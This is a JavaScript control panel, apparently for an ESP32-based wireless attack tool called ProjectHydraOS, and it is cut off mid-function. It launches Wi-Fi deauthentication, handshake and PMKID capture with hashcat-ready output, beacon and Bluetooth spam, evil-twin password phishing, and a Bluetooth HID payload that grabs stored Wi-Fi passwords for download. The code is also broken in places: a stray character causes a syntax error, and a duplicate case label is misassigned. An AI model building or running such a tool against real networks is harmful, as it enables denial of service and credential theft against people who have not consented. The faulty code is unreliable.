/* ═══════════════════════════════════════════════════
 *  ProjectHydraOS — app.js  v1.1.3
 * ═══════════════════════════════════════════════════ */

var AttackStateEnum = { READY: 0, RUNNING: 1, FINISHED: 2, TIMEOUT: 3 };
var AttackTypeEnum  = {
    ATTACK_TYPE_PASSIVE:     0,
    ATTACK_TYPE_HANDSHAKE:   1,
    ATTACK_TYPE_PMKID:       2,
    ATTACK_TYPE_DOS:         3,
    ATTACK_TYPE_BEACON_SPAM: 4,
    ATTACK_TYPE_PROBE:       5,
    ATTACK_TYPE_EVIL_TWIN:   6,
    ATTACK_TYPE_BT_SPAM:     7,
    ATTACK_TYPE_CLONE:       8,
    ATTACK_TYPE_BT_PAYLOAD:  9
};

var selectedApElements    = [];
var apSsidMap             = {};
var running_poll          = null;
var running_poll_interval = 1000;
var attack_timeout        = 0;
var time_elapsed          = 0;
var currentAttackType     = -1;
var defaultAttackMethodsHTML = "";

/* ── Attack types that disconnect the management AP ── */
/* For these, timer/countdown is shown only for beacon spam;
 *  all others just show "initiated" + power-cycle warning if no timeout */
var DISCONNECTS_MGMT_AP = [
    AttackTypeEnum.ATTACK_TYPE_DOS,
AttackTypeEnum.ATTACK_TYPE_EVIL_TWIN,
AttackTypeEnum.ATTACK_TYPE_CLONE
];

/* ── Attack types that have NO timeout option ── */
var NO_TIMEOUT_TYPES = [
    AttackTypeEnum.ATTACK_TYPE_HANDSHAKE,
AttackTypeEnum.ATTACK_TYPE_PMKID,
AttackTypeEnum.ATTACK_TYPE_EVIL_TWIN,
AttackTypeEnum.ATTACK_TYPE_BT_PAYLOAD
];

window.onload = function () {
    defaultAttackMethodsHTML = document.getElementById("attack_method").outerHTML;

    /* Show disclaimer only once per browser */
    if (localStorage.getItem("hydra_disclaimer_v1") === "accepted") {
        document.getElementById("disclaimer-overlay").style.display = "none";
        init();
    } else {
        /* Checkbox enables the button */
        document.getElementById("disclaimer-check").addEventListener("change", function () {
            document.getElementById("disclaimer-btn").disabled = !this.checked;
        });
    }
};

function dismissDisclaimer() {
    localStorage.setItem("hydra_disclaimer_v1", "accepted");
    document.getElementById("disclaimer-overlay").style.display = "none";
    init();
}

function init() {
    getStatus();
    refreshAps();   /* Auto-scan on first load */
    loadCurrentUrl();
}

/* ── Tab switching ──────────────────────────────────── */
function switchTab(name) {
    document.querySelectorAll(".tab-btn").forEach(function (b) {
        b.classList.toggle("active", b.dataset.tab === name);
    });
    document.querySelectorAll(".tab-panel").forEach(function (p) {
        p.classList.toggle("active", p.id === "tab-" + name);
    });
}

/* ── AP Scanning ────────────────────────────────────── */
function refreshAps() {
    selectedApElements = [];
    apSsidMap = {};
    updateSelectedChips();
    updateSelectedCountBadge();

    var tbody = document.getElementById("ap-list");
    tbody.innerHTML = '<tr><td colspan="3" class="table-empty-msg">Scanning… this may take a few seconds</td></tr>';

    var oReq = new XMLHttpRequest();
    oReq.responseType = "arraybuffer";
    oReq.timeout = 15000;

    oReq.onload = function () {
        tbody.innerHTML = "";
        var buf = oReq.response;
        if (!buf || buf.byteLength === 0) {
            tbody.innerHTML = '<tr><td colspan="3" class="table-empty-msg" style="color:var(--danger);">No APs found.</td></tr>';
            return;
        }
        var byteArray = new Uint8Array(buf);
        var count = Math.floor(byteArray.byteLength / 40);
        if (count === 0) {
            tbody.innerHTML = '<tr><td colspan="3" class="table-empty-msg" style="color:var(--danger);">No APs found.</td></tr>';
            return;
        }
        for (var i = 0; i < count; i++) {
            var offset = i * 40;
            var ssid   = new TextDecoder("utf-8").decode(byteArray.subarray(offset, offset + 32)).replace(/\0/g, "").trim();
            var bssid  = "";
            for (var j = 0; j < 6; j++) {
                bssid += uint8ToHex(byteArray[offset + 33 + j]);
                if (j < 5) bssid += ":";
            }
            var rssiRaw = byteArray[offset + 39];
            var rssi    = rssiRaw - 255;
            apSsidMap[i] = ssid || ("AP #" + i);

            var tr = document.createElement("tr");
            tr.id  = String(i);
            tr.setAttribute("onclick", "selectAp(this)");
            tr.innerHTML =
            '<td>' + escapeHtml(apSsidMap[i]) + '</td>' +
            '<td><code>' + bssid + '</code></td>' +
            '<td>' + rssi + ' dBm</td>';
            tbody.appendChild(tr);
        }
    };
    oReq.onerror   = function () { tbody.innerHTML = '<tr><td colspan="3" class="table-empty-msg" style="color:var(--danger);">Scan failed. Check connection to ESP32.</td></tr>'; };
    oReq.ontimeout = function () { tbody.innerHTML = '<tr><td colspan="3" class="table-empty-msg" style="color:var(--danger);">Scan timed out.</td></tr>'; };
    oReq.open("GET", "http://192.168.4.1/ap-list", true);
    oReq.send();
}

/* ── AP Selection ───────────────────────────────────── */
function getMaxTargets() {
    var attackType   = parseInt(document.getElementById("attack_type").value);
    var attackMethod = parseInt(document.getElementById("attack_method").value);
    if (isNaN(attackType)) return 16;
    if (attackType === AttackTypeEnum.ATTACK_TYPE_HANDSHAKE) return 1;
    if (attackType === AttackTypeEnum.ATTACK_TYPE_PMKID)     return 1;
    if (attackType === AttackTypeEnum.ATTACK_TYPE_CLONE)     return 1;
    if (attackType === AttackTypeEnum.ATTACK_TYPE_DOS) {
        if (!isNaN(attackMethod) && attackMethod === 1) return 16;
        return 1;
    }
    if (attackType === AttackTypeEnum.ATTACK_TYPE_BEACON_SPAM) return 0;
    if (attackType === AttackTypeEnum.ATTACK_TYPE_BT_SPAM)     return 0;
    if (attackType === AttackTypeEnum.ATTACK_TYPE_PROBE)     return 0;
    if (attackType === AttackTypeEnum.ATTACK_TYPE_BT_PAYLOAD)     return 0;
    return 1;
}

function selectAp(el) {
    var id  = parseInt(el.id);
    var max = getMaxTargets();
    if (max === 0) return;
    var idx = selectedApElements.indexOf(id);
    if (idx > -1) {
        selectedApElements.splice(idx, 1);
        el.classList.remove("selected");
    } else {
        if (selectedApElements.length >= max) {
            var prevId  = selectedApElements[0];
            var prevRow = document.getElementById(String(prevId));
            if (prevRow) prevRow.classList.remove("selected");
            selectedApElements = [];
        }
        selectedApElements.push(id);
        el.classList.add("selected");
    }
    updateSelectedChips();
    updateSelectedCountBadge();
}

function deselectAp(id) {
    var idx = selectedApElements.indexOf(id);
    if (idx > -1) {
        selectedApElements.splice(idx, 1);
        var row = document.getElementById(String(id));
        if (row) row.classList.remove("selected");
    }
    updateSelectedChips();
    updateSelectedCountBadge();
}

function enforceSelectionLimit() {
    var max = getMaxTargets();
    while (selectedApElements.length > max && max >= 0) {
        var removedId  = selectedApElements.pop();
        var removedRow = document.getElementById(String(removedId));
        if (removedRow) removedRow.classList.remove("selected");
    }
    updateSelectedChips();
    updateSelectedCountBadge();
}

function updateSelectedChips() {
    var container = document.getElementById("selected-ap-chips");
    if (!container) return;
    if (selectedApElements.length === 0) {
        container.innerHTML = '<span class="no-ap-hint">No AP selected — tap a row in the Scan tab</span>';
        return;
    }
    container.innerHTML = "";
    selectedApElements.forEach(function (id) {
        var ssid = escapeHtml(apSsidMap[id] || ("AP #" + id));
        var chip = document.createElement("span");
        chip.className = "ap-chip";
        chip.innerHTML = ssid + '<span class="chip-x" onclick="deselectAp(' + id + ')">✕</span>';
        container.appendChild(chip);
    });
}

function updateSelectedCountBadge() {
    var badge = document.getElementById("selected-count-badge");
    var n = selectedApElements.length;
    if (badge) badge.textContent = n === 0 ? "0 selected" : n + " selected";
}

/* ── Attack Type Selection ──────────────────────────── */
function selectAttackType(type, btn) {
    document.querySelectorAll('.type-btn').forEach(function (b) { b.classList.remove('active'); });
    btn.classList.add('active');
    document.getElementById('attack_type').value = type;
    updateConfigurableFields({ value: type });
}

function updateConfigurableFields(el) {
    document.getElementById("attack_method").outerHTML = defaultAttackMethodsHTML;
    var beaconCfg  = document.getElementById("beacon_config");
    var methodRow  = document.getElementById("method-row");
    var timeoutRow = document.getElementById("timeout-row");
    var noTimeoutNote = document.getElementById("no-timeout-note");

    beaconCfg.style.display  = "none";
    if (methodRow)  methodRow.style.display  = "block";
    if (timeoutRow) timeoutRow.style.display = "block";
    if (noTimeoutNote) noTimeoutNote.style.display = "none";

    var type = parseInt(el.value);

    /* Hide timeout for Handshake, PMKID, Evil Twin */
    if (NO_TIMEOUT_TYPES.indexOf(type) !== -1) {
        if (timeoutRow) timeoutRow.style.display = "none";
    }

    switch (type) {
        case AttackTypeEnum.ATTACK_TYPE_HANDSHAKE:
            setAttackMethods(["BSSID Clone (aggresive)", "Normal deauth", "Silent capture"]);
            break;
        case AttackTypeEnum.ATTACK_TYPE_PMKID:
            if (methodRow) methodRow.style.display = "none";
            break;
        case AttackTypeEnum.ATTACK_TYPE_DOS:
            document.getElementById("attack_timeout").value = 2;
            if (noTimeoutNote) noTimeoutNote.style.display = "block";
            setAttackMethods(["BSSID Clone (aggresive)", "Normal Deauth", "Combined deauth", "Deauth with multiple clones", "Handshake Hijack"]);
        break;
        case AttackTypeEnum.ATTACK_TYPE_BEACON_SPAM:
            document.getElementById("attack_timeout").value = 5;
            if (methodRow) methodRow.style.display = "none";
            beaconCfg.style.display = "block";
            break;
        case AttackTypeEnum.ATTACK_TYPE_PROBE:
            document.getElementById("attack_timeout").value = 5;
            if (methodRow) methodRow.style.display = "none";
            break;
        case AttackTypeEnum.ATTACK_TYPE_EVIL_TWIN:
            if (methodRow) methodRow.style.display = "none";
            break;
        case AttackTypeEnum.ATTACK_TYPE_BT_SPAM:
            document.getElementById("attack_timeout").value = 5;s
            break;
        case AttackTypeEnum.ATTACK_TYPE_CLONE:
            document.getElementById("attack_timeout").value = 5;
            if (noTimeoutNote) noTimeoutNote.style.display = "block";
            setAttackMethods(["Open multiple clones"]);
            break;
        case AttackTypeEnum.ATTACK_TYPE_BT_PAYLOAD:
            if (methodRow) methodRow.style.display = "none";
            break;
    }
    enforceSelectionLimit();
}

function setAttackMethods(arr) {
    var sel = document.getElementById("attack_method");
    sel.removeAttribute("disabled");
    while (sel.options.length > 0) sel.remove(0);
    arr.forEach(function (label, idx) {
        var opt   = document.createElement("option");
        opt.value = idx;
        opt.text  = label;
        sel.appendChild(opt);
    });
    sel.selectedIndex = 0;
    enforceSelectionLimit();
}

/* ── Run Attack ─────────────────────────────────────── */
function runAttack() {
    hideError();
    var attackType = parseInt(document.getElementById("attack_type").value);
    if (isNaN(attackType)) {
        showDialog("Please select an attack type first.");
        return false;
    }

    var needsAp = (
        attackType !== AttackTypeEnum.ATTACK_TYPE_BEACON_SPAM &&
        attackType !== AttackTypeEnum.ATTACK_TYPE_BT_SPAM &&
        attackType !== AttackTypeEnum.ATTACK_TYPE_PROBE &&
        attackType !== AttackTypeEnum.ATTACK_TYPE_BT_PAYLOAD
    );

    if (needsAp && selectedApElements.length === 0) {
        showDialog("Please select at least one target before the attack.");
        return false;
    }

    var MAX_TARGETS = 16;

    /* Timeout: fixed 0 (no timeout) for no-timeout types */
    var isNoTimeout = NO_TIMEOUT_TYPES.indexOf(attackType) !== -1;
    var timeoutEnabled = isNoTimeout ? false : document.getElementById("timeout_enable").checked;
    var timeoutMin     = parseInt(document.getElementById("attack_timeout").value) || 1;
    var timeoutSec     = timeoutEnabled ? Math.min(65535, timeoutMin * 60) : 0;

    var attackMethod = (attackType === AttackTypeEnum.ATTACK_TYPE_BEACON_SPAM)
    ? (parseInt(document.getElementById("beacon_count").value) || 20)
    : (parseInt(document.getElementById("attack_method").value) || 0);

    var ids = selectedApElements.slice(0, MAX_TARGETS);
    var buf = new ArrayBuffer(5 + MAX_TARGETS);
    var arr = new Uint8Array(buf);

    arr[0] = attackType;   // Byte 0
    arr[1] = attackMethod; // Byte 1

    // ৩. Timeout-কে ২ বাইটে ভাগ করা (Little Endian পদ্ধতিতে)
    arr[2] = timeoutSec & 0xFF;         // Byte 2: Lower byte
    arr[3] = (timeoutSec >> 8) & 0xFF;  // Byte 3: Upper byte

    // ৪. AP Count এখন ৪ নম্বর ইনডেক্সে চলে যাবে
    arr[4] = ids.length;   // Byte 4

    // ৫. AP IDs এখন ৫ নম্বর ইনডেক্স থেকে শুরু হবে
    ids.forEach(function (id, i) { arr[5 + i] = id; });

    currentAttackType = attackType;

    switchTab("attack");
    setRunningVisible(true);
    setResultVisible(false);

    /* Show the right running UI */
    var beaconWrap  = document.getElementById("beacon-timer-wrap");
    var simpleWrap  = document.getElementById("simple-running-wrap");
    var noTOHint    = document.getElementById("no-timeout-hint");
    var infoEl      = document.getElementById("running-attack-info");

    if (attackType === AttackTypeEnum.ATTACK_TYPE_BEACON_SPAM) {
        /* Full circular timer only for beacon spam */
        beaconWrap.style.display  = "block";
        simpleWrap.style.display  = "none";
        if (noTOHint) noTOHint.style.display = "none";
        attack_timeout = timeoutEnabled ? (timeoutMin * 60) : Infinity;
        time_elapsed   = 0;
        stopProgressTimer();
        running_poll = setInterval(countProgress, running_poll_interval);
        updateTimerDisplay();
    } else {
        /* All other attacks: simple "initiated" view */
        beaconWrap.style.display  = "none";
        simpleWrap.style.display  = "block";
        stopProgressTimer();
        /* Show power-cycle warning if management AP disconnects and no timeout */
        var disconnects = DISCONNECTS_MGMT_AP.indexOf(attackType) !== -1;
        if (noTOHint) {
            noTOHint.style.display = (disconnects && !timeoutEnabled && !isNoTimeout) ? "block" : "none";
        }
    }

    if (infoEl) infoEl.textContent = attackTypeName(attackType);

    var oReq = new XMLHttpRequest();
    oReq.open("POST", "http://192.168.4.1/run-attack", true);
    oReq.onload  = function () { setTimeout(getStatus, 500); };
    oReq.onerror = function () {
        /* DoS/Handshake disconnect the AP — ignore connection error */
        if (attackType !== AttackTypeEnum.ATTACK_TYPE_DOS &&
            attackType !== AttackTypeEnum.ATTACK_TYPE_HANDSHAKE &&
            attackType !== AttackTypeEnum.ATTACK_TYPE_EVIL_TWIN &&
            attackType !== AttackTypeEnum.ATTACK_TYPE_CLONE) {
            showError("Check ESP32 connection.");
            }
    };
    oReq.send(buf);

    return false;
}

/* ── Timer Helpers ──────────────────────────────────── */
function stopProgressTimer() {
    if (running_poll) { clearInterval(running_poll); running_poll = null; }
}

function countProgress() {
    if (attack_timeout !== Infinity && time_elapsed >= attack_timeout) {
        stopProgressTimer();
    }
    updateTimerDisplay();
    time_elapsed++;
}

function updateTimerDisplay() {
    var elEl = document.getElementById("timer-elapsed");
    var ofEl = document.getElementById("timer-of");
    var path = document.getElementById("timer-path");

    if (!elEl) return;
    elEl.textContent = formatTime(time_elapsed);

    if (attack_timeout === Infinity) {
        if (ofEl) ofEl.textContent = "No Timeout was set";
        if (path) path.setAttribute('stroke-dasharray', '100, 100');
    } else {
        if (ofEl) ofEl.textContent = "/ " + formatTime(attack_timeout);
        var progress = Math.min((time_elapsed / attack_timeout) * 100, 100);
        if (path) path.setAttribute('stroke-dasharray', progress + ', 100');
    }
}

function formatTime(sec) {
    if (sec === Infinity || isNaN(sec)) return "∞";
    var m = Math.floor(sec / 60);
    var s = sec % 60;
    return (m > 0 ? m + "m " : "") + s + "s";
}

/* ── Running / Result Visibility ───────────────────── */
function setRunningVisible(v) {
    document.getElementById("running-section").style.display       = v ? "block" : "none";
    document.getElementById("attack-config-section").style.display = v ? "none"  : "block";
}

function setResultVisible(v) {
    document.getElementById("result-section").style.display  = v ? "block" : "none";
    document.getElementById("running-section").style.display = v ? "none"  : "block";
}

/* ── Show Result ────────────────────────────────────── */
function showResult(status, attack_type, content_size, content) {
    stopProgressTimer();
    document.getElementById("running-section").style.display = "none";
    document.getElementById("result-section").style.display  = "block";

    /* DoS and Handshake finishing on timeout is normal — show FINISHED */
    if (status === "TIMEOUT" &&
        (attack_type === AttackTypeEnum.ATTACK_TYPE_DOS ||
        attack_type === AttackTypeEnum.ATTACK_TYPE_HANDSHAKE)) {
        status = "FINISHED";
        }

        var statusEl = document.getElementById("result-status");
    statusEl.textContent = status;
    statusEl.className   = "result-status " + (status === "FINISHED" ? "status-finished" : "status-timeout");

    document.getElementById("result-type").textContent   = attackTypeName(attack_type);
    document.getElementById("result-body").innerHTML     = "";

    switch (attack_type) {
        case AttackTypeEnum.ATTACK_TYPE_HANDSHAKE:
            renderHandshakeResult(content, content_size);
            break;
        case AttackTypeEnum.ATTACK_TYPE_PMKID:
            renderPmkidResult(content, content_size);
            break;
        case AttackTypeEnum.ATTACK_TYPE_DOS:
            document.getElementById("result-body").innerHTML =
            '<p style="color:var(--text-muted);">Deauthentication attack completed. Targets were disconnected during the session.</p>';
        break;
        case AttackTypeEnum.ATTACK_TYPE_BEACON_SPAM:
            document.getElementById("result-body").innerHTML =
            '<p style="color:var(--text-muted);">Beacon spam completed.</p>';
        break;
        case AttackTypeEnum.ATTACK_TYPE_PROBE:
            document.getElementById("result-body").innerHTML =
            '<p style="color:var(--text-muted);">Probe attack completed. Data captured in serial log.</p>';
            break;
        case AttackTypeEnum.ATTACK_TYPE_EVIL_TWIN:
            fetchEvilTwinResult();
            break;
        case AttackTypeEnum.ATTACK_TYPE_BT_SPAM:
            document.getElementById("result-body").innerHTML =
            '<div class="result-block" style="text-align:center;padding:20px 0;">' +
            '<p style="font-size:1.2rem;margin-bottom:8px;">BLE Spam Finished</p>' +
            '<p style="color:var(--text-muted);font-size:0.85rem;">Apple device advertisements were broadcast. Nearby iOS/macOS devices should have seen popups.</p>' +
            '</div>';
            break;
        case 4: // Payload 4
            document.getElementById("result-body").innerHTML =
            '<div class="result-block">' +
            '<h4>Wi-Fi Credentials Grabbed</h4>' +
            '<p>Payload executed via HID attack. Results are stored in ESP32 memory.</p>' +
            '<a class="btn-primary" style="text-decoration:none;display:inline-block;margin-top:10px;" href="http://192.168.4.1/download-pass" download="wifi_passwords.txt">DOWNLOAD PASSWORDS</a>' +
            '</div>';
            break;
        default:
            document.getElementById("result-body").innerHTML =
            '<p style="color:var(--text-muted);">Attack initiated — type ' + attack_type + '.</p>';
    }
    switchTab("attack");
}

/* ── Handshake Result ───────────────────────────────── */
function renderHandshakeResult(content, size) {
    var el = document.getElementById("result-body");
    /* Fix: hccapx requires at least 4 bytes; pcap can be larger. Reasonable minimum ~50 bytes */
    if (!content || size < 4) {
        el.innerHTML =
        '<p style="color:var(--danger);font-weight:600;margin-bottom:8px;">Handshake not captured.</p>' +
        '<p style="color:var(--text-muted);font-size:.85rem;">Not enough EAPOL frames collected. Try moving closer to the AP or use the Broadcast method to force reconnection.</p>';
        return;
    }
    /* Even if content is small, offer download links — firmware may have buffered the pcap */
    var hs = "";
    for (var i = 0; i < size; i++) {
        hs += uint8ToHex(content[i]);
        if (i % 50 === 49) hs += "\n";
    }
    el.innerHTML =
    '<div style="display:flex;gap:8px;flex-wrap:wrap;margin-bottom:14px;">' +
    '<a class="btn-secondary" style="text-decoration:none;display:inline-block;" href="http://192.168.4.1/capture.pcap" download="capture.pcap">DOWNLOAD PCAP</a>' +
    '<a class="btn-secondary" style="text-decoration:none;display:inline-block;" href="http://192.168.4.1/capture.hccapx" download="capture.hccapx">DOWNLOAD HCCAPX</a>' +
    '</div>' +
    '<div class="result-block"><h4>Raw HCCAPX Hex Dump</h4>' +
    '<pre><code id="hccapx-dump">' + hs + '</code></pre>' +
    '<button class="btn-secondary" style="margin-top:8px;" onclick="copyText(\'hccapx-dump\', this)">COPY</button>' +
    '</div>';
}

/* ── PMKID Result ───────────────────────────────────── */
function renderPmkidResult(content, size) {
    var el = document.getElementById("result-body");
    if (!content || size < 13) {
        el.innerHTML = '<p style="color:var(--danger);">No PMKID captured. Try again closer to the AP.</p>';
        return;
    }
    var idx = 0;
    var mac_sta = "", mac_ap = "", ssid = "", ssid_text = "";
    for (var i = 0; i < 6; i++) mac_sta += uint8ToHex(content[idx + i]);
    idx += 6;
    for (var i = 0; i < 6; i++) mac_ap  += uint8ToHex(content[idx + i]);
    idx += 6;
    var ssid_len = content[idx]; idx++;
    for (var i = 0; i < ssid_len; i++) {
        ssid      += uint8ToHex(content[idx + i]);
        ssid_text += String.fromCharCode(content[idx + i]);
    }
    idx += ssid_len;
    var pmkid_lines = [];
    for (var i = 0; i < size - idx; i++) {
        if (i % 16 === 0) pmkid_lines.push("");
        pmkid_lines[pmkid_lines.length - 1] += uint8ToHex(content[idx + i]);
    }
    var hashcat = (pmkid_lines[0] || "") + "*" + mac_ap + "*" + mac_sta + "*" + ssid;
    el.innerHTML =
    '<div class="result-block">' +
    '<p><strong>Station MAC:</strong> <code>' + mac_sta + '</code></p>' +
    '<p><strong>AP MAC:</strong> <code>' + mac_ap + '</code></p>' +
    '<p><strong>SSID:</strong> <code>' + ssid + '</code> (' + escapeHtml(ssid_text) + ')</p>' +
    '</div>' +
    '<div class="result-block"><h4>PMKID</h4>' +
    pmkid_lines.map(function (p, i) { return '<p>PMKID #' + i + ': <code>' + p + '</code></p>'; }).join("") +
    '</div>' +
    '<div class="result-block"><h4>Hashcat Format</h4>' +
    '<pre><code id="hashcat-line">' + hashcat + '</code></pre>' +
    '<button class="btn-secondary" style="margin-top:8px;" onclick="copyText(\'hashcat-line\', this)">COPY</button>' +
    '</div>';
}

/* ── Evil Twin Result ───────────────────────────────── */
function fetchEvilTwinResult() {
    fetch('http://192.168.4.1/evil-twin-status')
    .then(function (r) { return r.json(); })
    .then(function (data) {
        var el = document.getElementById("result-body");
        if (data.status === "SUCCESS") {
            el.innerHTML =
            '<div class="evil-twin-password-box">' +
            '<div class="success-icon">✓</div>' +
            '<div class="label-text">Password Captured</div>' +
            '<div class="password-value" id="et-password">' + escapeHtml(data.password) + '</div>' +
            (data.wrong_attempts > 0
            ? '<div class="wrong-attempts">Wrong attempts before correct password: <strong>' + data.wrong_attempts + '</strong></div>'
            : '') +
            '<button class="btn-secondary" style="margin-top:14px;" onclick="copyText(\'et-password\', this)">COPY PASSWORD</button>' +
            '</div>';
        } else if (data.status === "RUNNING") {
            el.innerHTML =
            '<div class="evil-twin-running" style="text-align:center;padding:20px 0;">' +
            '<div class="spinner"></div>' +
            '<p>Evil Twin attack in progress…</p>' +
            '<p style="color:var(--warn-text);margin-top:8px;font-size:0.85rem;">Wrong attempts so far: <strong>' + data.wrong_attempts + '</strong></p>' +
            '</div>';
            setTimeout(fetchEvilTwinResult, 2000);
        } else {
            el.innerHTML =
            '<div class="result-block" style="text-align:center;">' +
            '<p style="color:var(--danger);">Attack stopped — password not captured.</p>' +
            '<p style="color:var(--text-muted);margin-top:8px;font-size:0.85rem;">Wrong attempts: ' + data.wrong_attempts + '</p>' +
            '</div>';
        }
    })
    .catch(function () {
        document.getElementById("result-body").innerHTML =
        '<p style="color:var(--danger);">Failed to fetch Evil Twin status. ESP32 may have disconnected.</p>';
    });
}

/* ── Reset Attack ───────────────────────────────────── */
function resetAttack() {
    stopProgressTimer();
    document.getElementById("result-section").style.display         = "none";
    document.getElementById("running-section").style.display        = "none";
    document.getElementById("attack-config-section").style.display  = "block";
    selectedApElements = [];
    updateSelectedChips();
    updateSelectedCountBadge();

    var oReq = new XMLHttpRequest();
    oReq.open("HEAD", "http://192.168.4.1/reset", true);
    oReq.send();
}

/* ── Status Polling ─────────────────────────────────── */
function getStatus() {
    var oReq = new XMLHttpRequest();
    oReq.responseType = "arraybuffer";
    oReq.timeout = 5000;

    oReq.onload = function () {
        var buf = oReq.response;
        if (!buf || buf.byteLength === 0) return;
        var arr = new Uint8Array(buf);

        var attack_state = arr[0];
        var attack_type  = arr[1];
        var content_size = arr[2] | (arr[3] << 8);
        var content      = arr.slice(4);

        if (attack_state === AttackStateEnum.RUNNING) {
            showRunning(attack_type);
        } else if (attack_state === AttackStateEnum.FINISHED ||
            attack_state === AttackStateEnum.TIMEOUT) {
            var statusLabel = (attack_state === AttackStateEnum.TIMEOUT) ? "TIMEOUT" : "FINISHED";
        showResult(statusLabel, attack_type, content_size, content);
            }
    };
    oReq.onerror = function () { /* ESP32 may be running an attack that cuts the AP */ };
    oReq.open("GET", "http://192.168.4.1/status", true);
    oReq.send();
}

function showRunning(attack_type) {
    setRunningVisible(true);
    setResultVisible(false);
    var infoEl = document.getElementById("running-attack-info");
    if (infoEl) infoEl.textContent = attackTypeName(attack_type);

    var beaconWrap = document.getElementById("beacon-timer-wrap");
    var simpleWrap = document.getElementById("simple-running-wrap");
    var btControls = document.getElementById("bt-payload-controls");

    if (attack_type === AttackTypeEnum.ATTACK_TYPE_BT_PAYLOAD) {
        if (beaconWrap) beaconWrap.style.display = "none";
        if (simpleWrap) simpleWrap.style.display = "block";
        if (btControls) btControls.style.display = "block";
    } else {
        if (beaconWrap) {
            if (attack_type === AttackTypeEnum.ATTACK_TYPE_BEACON_SPAM) {
                beaconWrap.style.display = "block";
                simpleWrap.style.display = "none";
            } else {
                beaconWrap.style.display = "none";
                simpleWrap.style.display = "block";
            }
        }
        if (btControls) btControls.style.display = "none";
    }
    switchTab("attack");
}

/* ── Error Helpers ──────────────────────────────────── */
function showError(msg) {
    var el = document.getElementById("errors");
    el.textContent = msg;
    el.style.display = "block";
}

function hideError() {
    document.getElementById("errors").style.display = "none";
}

/* ── Dialog ─────────────────────────────────────────── */
function showDialog(msg) {
    document.getElementById("dialog-msg").textContent = msg;
    document.getElementById("dialog-overlay").classList.remove("hidden");
}
function closeDialog() {
    document.getElementById("dialog-overlay").classList.add("hidden");
}

/* ── Detector ───────────────────────────────────────── */
var detectedAlerts = {};
var detectorPoll   = null;

function startDetector() {
    fetch('http://192.168.4.1/detector/start', { method: 'POST' })
    .then(function () {
        document.getElementById('detector-status-text').textContent = 'MONITORING';
        document.getElementById('detector-status-text').className   = 'det-status running';
        document.getElementById('btn-det-start').disabled = true;
        document.getElementById('btn-det-stop').disabled  = false;
        document.getElementById('btn-det-clear').disabled = false;
        var stateMsg = document.getElementById('detector-state-msg');
        if (stateMsg) stateMsg.style.display = 'none';
        detectorPoll = setInterval(pollDetector, 2000);
    })
    .catch(function (err) { showError("Could not start detector: " + err); });
}

function stopDetector() {
    fetch('http://192.168.4.1/detector/stop', { method: 'POST' })
    .then(function () {
        clearInterval(detectorPoll);
        detectorPoll = null;
        document.getElementById('detector-status-text').textContent = 'IDLE';
        document.getElementById('detector-status-text').className   = 'det-status';
        document.getElementById('btn-det-start').disabled = false;
        document.getElementById('btn-det-stop').disabled  = true;
        var stateMsg = document.getElementById('detector-state-msg');
        if (stateMsg) {
            stateMsg.style.display = 'block';
            stateMsg.textContent   = 'Press START MONITOR to begin scanning';
        }
    })
    .catch(function (err) { showError("Could not stop detector: " + err); });
}

function clearAlerts() {
    detectedAlerts = {};
    var list = document.getElementById('detector-table-body');
    list.innerHTML = '<tr><td colspan="3" class="table-empty-msg">No alerts yet</td></tr>';
    document.getElementById('alert-count-badge').textContent = '0';
    document.getElementById('btn-det-clear').disabled = true;
}

function pollDetector() {
    fetch('http://192.168.4.1/detector/status')
    .then(function (r) { return r.json(); })
    .then(function (data) {
        if (data.alerts && data.alerts.length > 0) {
            for (var i = 0; i < data.alerts.length; i++) {
                var a = data.alerts[i];
                detectedAlerts[a.bssid] = a.count;
            }
        }
        var bssids     = Object.keys(detectedAlerts);
        var alertCount = bssids.length;

        document.getElementById('alert-count-badge').textContent  = alertCount;
        document.getElementById('btn-det-clear').disabled = (alertCount === 0);

        var list = document.getElementById('detector-table-body');
        if (alertCount === 0) {
            list.innerHTML = '<tr><td colspan="3" class="table-empty-msg">✓ No attacks detected</td></tr>';
            return;
        }
        var rows = '';
        for (var j = 0; j < bssids.length; j++) {
            var bssid = bssids[j];
            rows +=
            '<tr>' +
            '<td><code>' + escapeHtml(bssid) + '</code></td>' +
            '<td>' + detectedAlerts[bssid] + '</td>' +
            '<td style="color:var(--danger);font-weight:600;">HIGH</td>' +
            '</tr>';
        }
        list.innerHTML = rows;
    })
    .catch(function () {
        var list = document.getElementById('detector-table-body');
        list.innerHTML = '<tr><td colspan="3" class="table-empty-msg">⚠ Connection lost (ESP32 disconnected?)</td></tr>';
    });
}

function setBtPayload(payload) {
    fetch('/bt-payload-set', {
        method: 'POST',
        body: String(payload)
    })
    .then(function(response) {
        if (response.ok) {
            showDialog("BT Payload changed to " + payload + ". Will take effect on next connection.");
        } else {
            showError("Failed to set payload");
        }
    })
    .catch(function(err) {
        showError("Network error: " + err);
    });
}

/* ── Settings ───────────────────────────────────────── */
function saveSettings() {
    var ssid = document.getElementById('ap-ssid').value.trim();
    var pass = document.getElementById('ap-pass').value;

    if (ssid.length < 1 || pass.length < 8) {
        showDialog("SSID cannot be empty and password must be at least 8 characters.");
        return;
    }

    if (!confirm("The device will restart. You will need to reconnect to the new SSID.")) return;

    fetch('/save_settings', {
        method: 'POST',
        headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
        body: 'ssid=' + encodeURIComponent(ssid) + '&pass=' + encodeURIComponent(pass)
    })
    .then(function (response) {
        if (response.ok) {
            showDialog("Settings saved. Wait 5–10 seconds for the ESP32 to reboot, then connect to the new network.");
        } else {
            showDialog("Failed to save settings. Please try again.");
        }
    })
    .catch(function () {
        showDialog("Network error — the ESP32 may already be restarting.");
    });
}

/* ── Copy Helper ────────────────────────────────────── */
function copyText(elemId, btn) {
    var text = document.getElementById(elemId).textContent;
    if (navigator.clipboard && navigator.clipboard.writeText) {
        navigator.clipboard.writeText(text).then(function () {
            var orig = btn.textContent;
            btn.textContent = "COPIED";
            setTimeout(function () { btn.textContent = orig; }, 1500);
        });
    } else {
        var ta = document.createElement("textarea");
        ta.value = text;
        ta.style.position = "fixed"; ta.style.opacity = "0";
        document.body.appendChild(ta); ta.select(); document.execCommand("copy"); document.body.removeChild(ta);
        var orig = btn.textContent;
        btn.textContent = "COPIED";
        setTimeout(function () { btn.textContent = orig; }, 1500);
    }
}

/* ── Utilities ──────────────────────────────────────── */
function uint8ToHex(b) { return ("00" + b.toString(16)).slice(-2); }
function escapeHtml(s) {
    return String(s)
    .replace(/&/g, "&amp;")
    .replace(/</g, "&lt;")
    .replace(/>/g, "&gt;")
    .replace(/"/g, "&quot;");
}
function attackTypeName(t) {
    switch (t) {
